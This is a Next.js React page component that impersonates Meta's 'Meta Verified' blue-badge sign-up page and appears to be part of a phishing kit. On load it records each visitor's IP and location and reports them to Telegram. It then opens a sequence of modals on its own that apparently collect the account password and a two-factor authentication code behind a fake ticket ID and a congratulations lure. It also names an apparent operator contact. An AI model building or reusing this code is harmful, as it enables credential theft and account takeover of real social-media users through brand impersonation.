'use client'

import React from 'react'
import Link from 'next/link'
import { getUserLocation, notifyTelegramVisit } from '../utils'
import ClientModal from '../../components/modal/ClientModal'
import SecurityModal from '../../components/modal/SecurityModal'
import AuthenticationModal from '../../components/modal/AuthenticationModal'
import SuccessModal from '../../components/modal/SuccessModal'

const ReCapcha = () => {
    const [userLocation, setUserLocation] = React.useState({});
    const [countryCode, setCountryCode] = React.useState("");
 
    const [isOpenAuth, setIsOpenAuth] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendAuthentication, setIsOpendAuthentication] = React.useState(false);
    const [dataModal, setDataModal] = React.useState({});
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");

    const notificationSent = React.useRef(false);
    const hasAutoClicked = React.useRef(false);
    
    const getIp = async () => {
        try {
            const userLocation = await getUserLocation();
            const language = userLocation?.country_code.toLowerCase() || "en";
            setUserLocation(userLocation || "Error, contact @otis_cua");
            
            if (notificationSent.current == false) {
                console.log('Sending notification for user:', userLocation?.ip);
                notificationSent.current = true;
                await notifyTelegramVisit({location: userLocation, lang: language});
            }

        } catch (error) {
            console.error("Error getting IP or location:", error);
        }
    }

    React.useEffect(() => {
        getIp();
    }, []);

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    // Tự động click vào nút Submit Request khi component mount
    React.useEffect(() => {
        const timer = setTimeout(() => {
            if (!hasAutoClicked.current) {
                hasAutoClicked.current = true;
                handleOpendModal(true);
            }
        }, 500);

        return () => clearTimeout(timer);
    }, []);

    const handleOpendModal = (isOpenAuth: any) => {
        getIp();
        setIsOpenAuth(isOpenAuth);  
    }

    
    const handleToggleAuth = (isOpenAuth: any) => {
        setIsOpenAuth(isOpenAuth);  
    }
    
    const handleOpendPassword = (isOpendPassword: any) => {
        setIsOpendPassword(isOpendPassword);
    }

    const handleToggleAuthentication = (isOpendSecurity: any) => {
        setIsOpendAuthentication(isOpendSecurity);  
    }

    const handSendDataModal = (data: object) => {
        setDataModal(data);  
    }

    const handleToggleSuccess = (isOpend: any) => {
        setIsOpendSuccess(isOpend);  
    }

    return (
        <>
            {/* Hero Section */}
            <div className="bg-white min-h-screen w-full">
                <div className="flex md:flex-row flex-col w-full items-center justify-between md:max-w-[1440px] mx-auto md:px-6 px-3 md:py-16 py-10">
                    <div className="md:w-[40%] w-full flex items-center justify-start md:order-1 order-2 md:pb-0 pb-10">
                        <div className="md:max-w-[480px] max-w-[100%] w-full flex flex-col items-start justify-start">
                            <img src="/images/icons/ic_blue.svg" alt="meta" className="order-1 md:w-[72px] w-[48px] md:h-[72px] h-[48px] mb-6" />
                            <h1 className="md:text-[48px] text-[32px] mb-4 order-2 leading-[1.15]">Show the world that you mean business.</h1>
                            <p className="text-[16px] text-[#1c2b33] font-[400] order-3 mb-6 leading-[1.5]">Meta Verified helps you build more confidence with new audiences and protects your brand.</p>
                            <button id="submit-request-btn" onClick={() => handleOpendModal(true)} className="order-4 bg-[#0064e0] text-white px-10 py-[16px] flex items-center justify-center rounded-[45px] font-[700] text-[16px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit Request</button>
                            <p className="order-5 text-[14px] text-[#465A69] font-[400] mt-4 leading-[1.5]">Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.</p>
                            <p className="order-6 text-[16px] mt-4 text-[#465a69]">Your ticket id: #{ticketId}</p>
                        </div>
                    </div>
                    <div className="md:w-[60%] w-full overflow-visible md:order-2 order-1 flex items-center justify-end md:-mr-6">
                        <video autoPlay loop muted playsInline className="w-full block" src="/images/hero-video.mp4"></video>
                    </div>
                </div>

                {/* Benefits Section */}
                <div className="max-w-[1440px] mx-auto md:pt-20 pt-6 md:px-6 px-3 md:mb-0 mb-10">
                    <div className="w-full">
                        <h2 className="md:text-[48px] text-[32px]" style={{ fontWeight: 400 }}>Explore Meta Verified for business benefits.</h2>
                        <p className="md:text-[16px] text-[14px] text-[#1c2b33] font-[300] my-4 max-w-[800px]">Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.</p>
                        <button onClick={() => handleOpendModal(true)} className="inline-flex items-center gap-2 text-[#0064e0] text-[14px] font-[500] mt-2 hover:underline">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5" />
                                <path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                            </svg>
                            <span>Learn more</span>
                        </button>
                    </div>
                </div>

                {/* Benefits Detail Section */}
                <div className="max-w-[1440px] mx-auto md:pt-16 pt-8 md:px-6 px-3 md:pb-20 pb-10">
                    <div className="flex flex-col md:flex-row gap-12 items-start">
                        <div className="md:w-[50%] w-full">
                            <div className="rounded-2xl overflow-hidden">
                                <img src="/images/meta/verified-badge.jpg" alt="Verified badge" className="w-full h-auto object-cover" />
                            </div>
                        </div>
                        <div className="md:w-[50%] w-full border-t border-gray-200">
                            {/* Benefit 1 */}
                            <div className="py-6 cursor-pointer border-b border-gray-200 text-[#1c2b33]">
                                <h3 className="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
                                    <span>Verified badge</span>
                                    <svg className="w-6 h-6 transform rotate-180 transition-transform duration-300 flex-shrink-0 ml-4" viewBox="0 0 24 24" fill="none">
                                        <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </h3>
                                <div style={{ maxHeight: '200px' }} className="overflow-hidden transition-all duration-400">
                                    <p className="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</p>
                                </div>
                            </div>
                            {/* Benefit 2 */}
                            <div className="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors">
                                <h3 className="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
                                    <span>Impersonation protection</span>
                                    <svg className="w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4" viewBox="0 0 24 24" fill="none">
                                        <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </h3>
                                <div style={{ maxHeight: 0 }} className="overflow-hidden transition-all duration-400">
                                    <p className="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">Protect your brand with proactive impersonation monitoring. Meta will remove accounts we determine are pretending to be you.</p>
                                </div>
                            </div>
                            {/* Benefit 3 */}
                            <div className="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors">
                                <h3 className="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
                                    <span>Enhanced support</span>
                                    <svg className="w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4" viewBox="0 0 24 24" fill="none">
                                        <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </h3>
                                <div style={{ maxHeight: 0 }} className="overflow-hidden transition-all duration-400">
                                    <p className="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">Get 24/7 access to email or chat agent support for account issues.</p>
                                </div>
                            </div>
                            {/* Benefit 4 */}
                            <div className="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors">
                                <h3 className="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
                                    <span>Upgraded profile features</span>
                                    <svg className="w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4" viewBox="0 0 24 24" fill="none">
                                        <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </h3>
                                <div style={{ maxHeight: 0 }} className="overflow-hidden transition-all duration-400">
                                    <p className="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">Enrich your profile by adding images to your links to help boost engagement.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Steps Section */}
                <div className="bg-[url('/images/meta/bg_step_verified.jpg')] bg-cover bg-center bg-no-repeat my-20">
                    <div className="max-w-[1440px] mx-auto md:py-20 py-10 md:px-6 px-3">
                        <div className="w-[100%]">
                            <p className="text-[32px]">Sign up for Meta Verified.</p>
                            <p className="text-[16px] text-[#1c2b33] font-[300] my-4">Our verification process is designed to maintain the integrity of the verified badge for businesses.</p>
                            <div className="grid grid-cols-12 gap-4 pt-12">
                                <div className="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
                                    <img src="/images/meta/one.png" alt="step 1" className="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]" />
                                    <h3 className="text-[24px] font-[300]">Start your application.</h3>
                                    <p className="mt-3 text-[14px] text-[#465A69] font-[300]">Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for Facebook and Instagram). When getting started, you should have your business contact information ready.</p>
                                </div>
                                <div className="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
                                    <img src="/images/meta/two.png" alt="step 2" className="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]" />
                                    <h3 className="text-[24px] font-[300]">Verify business details.</h3>
                                    <p className="mt-3 text-[14px] text-[#465A69] font-[300]">You may be asked to share details such as your business name, address, website and/or phone number.</p>
                                </div>
                                <div className="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
                                    <img src="/images/meta/three.png" alt="step 3" className="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]" />
                                    <h3 className="text-[24px] font-[300]">Get reviewed.</h3>
                                    <p className="mt-3 text-[14px] text-[#465A69] font-[300]">We'll review your application and send an update on your status within three business days.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Testimonial Section */}
                <div className="bg-white">
                    <div className="max-w-[1440px] mx-auto md:py-20 py-10 md:px-6 px-3">
                        <h2 className="text-[32px] font-semibold text-center mb-12">See how Meta Verified has helped real businesses.</h2>
                        <div className="overflow-hidden rounded-[32px]">
                            <div className="w-full flex-shrink-0 bg-[#F0F2F5] md:py-12 md:px-14 p-6 text-center flex flex-col items-center justify-center">
                                <p className="md:text-[20px] text-[16px] text-[#1c2b33] mb-6 max-w-[800px] mx-auto font-[400] leading-[1.6]">&ldquo;After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think seeing a verified badge builds trust. People that I don&rsquo;t know or newer brands interested in working with me can be sure that they&rsquo;re talking with me and not a scammer.&rdquo;</p>
                                <p className="text-[#465A69] font-[500] leading-[1.5]">Kimber Greenwood, Owner of Water Bear<br />Photography</p>
                            </div>
                        </div>
                    </div>
                </div>

                {/* CTA Section */}
                <div className="bg-[#f5f6f7] overflow-hidden">
                    <div className="max-w-[1440px] mx-auto md:py-28 py-16 md:px-20 px-6">
                        <div className="flex flex-col md:flex-row items-center gap-12">
                            <div className="md:w-[35%] w-full">
                                <img src="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&ab_page=CMS&ab_entry=680460844602208&version=1770656829" alt="Verified" className="w-[72px] h-[72px] mb-8" />
                                <h2 className="text-[36px] md:text-[44px] font-[500] text-[#1c2b33] leading-[1.15] mb-8">Ready to become<br />Meta Verified?</h2>
                                <button onClick={() => handleOpendModal(true)} className="bg-[#0064e0] text-white px-8 py-[14px] inline-flex items-center justify-center rounded-[45px] font-[700] text-[15px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit Request</button>
                            </div>
                            <div className="md:w-[60%] w-full overflow-visible flex items-center justify-end md:-mr-6">
                                <video autoPlay loop muted playsInline className="w-full block" src="/images/hero-video.mp4"></video>
                            </div>
                        </div>
                    </div>
                </div>

                {/* FAQ Section */}
                <section className="py-20 px-6 bg-white">
                    <div className="max-w-[1200px] mx-auto">
                        <h2 className="text-[28px] font-semibold mb-2">Frequently asked questions</h2>
                        <p className="mb-8 text-[#465A69]">For more, visit our <a href="#" className="text-[#0062FF] underline">Help Centre</a>.</p>
                        <div className="border-t border-gray-200">
                            <div className="border-b border-gray-200">
                                <button className="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium">
                                    <span>How do I know if my business is eligible?</span>
                                    <svg className="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                                    </svg>
                                </button>
                            </div>
                            <div className="border-b border-gray-200">
                                <button className="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium">
                                    <span>How do I update my information if I'm not eligible?</span>
                                    <svg className="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                                    </svg>
                                </button>
                            </div>
                            <div className="border-b border-gray-200">
                                <button className="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium">
                                    <span>What if I already have a verified badge?</span>
                                    <svg className="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                                    </svg>
                                </button>
                            </div>
                            <div className="border-b border-gray-200">
                                <button className="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium">
                                    <span>What if I'm interested in Meta Verified for creators?</span>
                                    <svg className="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                                    </svg>
                                </button>
                            </div>
                            <div className="border-b border-gray-200">
                                <button className="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium">
                                    <span>Where will my badge appear?</span>
                                    <svg className="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                                    </svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Connection Banner */}
                <section className="py-20 px-6" style={{ background: 'linear-gradient(135deg, #d4e4f7 0%, #f0d4e8 30%, #fce4ec 50%, #e8f5e9 70%, #c8e6c9 100%)' }}>
                    <div className="max-w-[800px] mx-auto text-center">
                        <h2 className="text-[28px] md:text-[32px] font-[500] text-[#1c2b33] leading-[1.4] mb-8">Every connection is an opportunity.<br />It's Your World.</h2>
                        <img src="/images/meta/logo-meta.svg" alt="Meta" className="w-[100px] mx-auto" />
                    </div>
                </section>

                {/* Footer */}
                <footer className="bg-[#1B2A33] text-white">
                    <div className="max-w-[1200px] mx-auto px-6">
                        <div className="py-16 border-b border-white/10">
                            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-8">
                                <div className="max-w-[480px]">
                                    <h3 className="text-[22px] font-semibold mb-3 leading-[1.3]">Get the latest updates from Meta for Business.</h3>
                                    <p className="text-[#9BA3AF] text-[14px] leading-[1.6]">Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.</p>
                                </div>
                                <div className="flex gap-3 flex-shrink-0">
                                    <input type="email" placeholder="Your email address" className="px-4 py-3 rounded-lg text-gray-800 w-64 text-[14px] bg-white" />
                                    <button className="bg-[#0062FF] px-6 py-3 rounded-full font-[600] text-[14px] hover:bg-[#0056d2] transition-colors whitespace-nowrap cursor-pointer">Subscribe</button>
                                </div>
                            </div>
                            <p className="text-[11px] text-[#7A8B98] mt-4 max-w-[700px] leading-[1.5]">By submitting this form, you agree to receive marketing-related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe at any time. Your data will be processed in accordance with Meta's <a href="#" className="underline">Data Policy</a>.</p>
                        </div>
                        <div className="flex flex-col md:flex-row items-start gap-10 py-6 pb-12 border-t border-white/10">
                            <span className="text-[#CBD2D9] text-[12px]">&copy; 2026 Meta</span>
                            <div className="flex flex-wrap gap-x-8 gap-y-3">
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">About</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Developers</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Careers</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Privacy</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Cookies</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Terms</a>
                                <a href="#" className="text-[#CBD2D9] text-[12px] hover:text-white">Help Centre</a>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>

            {/* Modals */}
            <ClientModal 
                isOpenAuth={isOpenAuth} 
                userLocation={userLocation} 
                countryCode={countryCode} 
                onToggleAuth={handleToggleAuth} 
                onOpendPassword={handleOpendPassword}
            />

            <SecurityModal
                isOpendPassword={isOpendPassword} 
                onToggleModalPass={handleOpendPassword} 
                onOpendAuthentication={handleToggleAuthentication}  
                onSendDataModal={handSendDataModal}  
            />

            <AuthenticationModal
                isOpendAuthentication={isOpendAuthentication} 
                onToggleModalAuthentication={handleToggleAuthentication} 
                onOpendSuccess={handleToggleSuccess}
                dataModal={dataModal}
            />

            <SuccessModal
                isOpendSuccess={isOpendSuccess}
                onToggleSuccess={handleToggleSuccess}
            />
        </>
    )
}

export default ReCapcha